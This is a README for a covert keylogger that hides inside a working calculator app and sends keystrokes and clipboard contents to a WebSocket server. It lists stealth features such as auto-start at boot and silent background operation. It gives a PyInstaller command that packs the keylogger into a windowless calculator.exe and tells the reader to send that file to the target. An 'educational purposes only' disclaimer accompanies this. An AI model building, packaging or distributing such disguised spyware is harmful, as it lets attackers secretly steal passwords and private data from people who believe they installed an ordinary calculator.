# Hidden Keylogger System

A stealthy keylogger system with WebSocket-based client-server architecture, disguised as a calculator application.

⚠️ **Educational purposes only. Unauthorized use is illegal.**

## Features

### Server
- WebSocket server supporting multiple simultaneous clients
- Secure data collection and storage
- Simple setup and deployment

### Client
- Embedded within a functional calculator application
- Auto-starts with system boot
- Silent background operation
- Secure WebSocket communication
- Keystroke buffering and encryption
- Captures copy/paste operations

## Setup
    to get the exe file run this command:
        "python -m PyInstaller --onefile --noconsole --add-data "keylogger.py;." calculator.py"

### Server
    just run server.py

### Client
    send the client the calculator.exe file
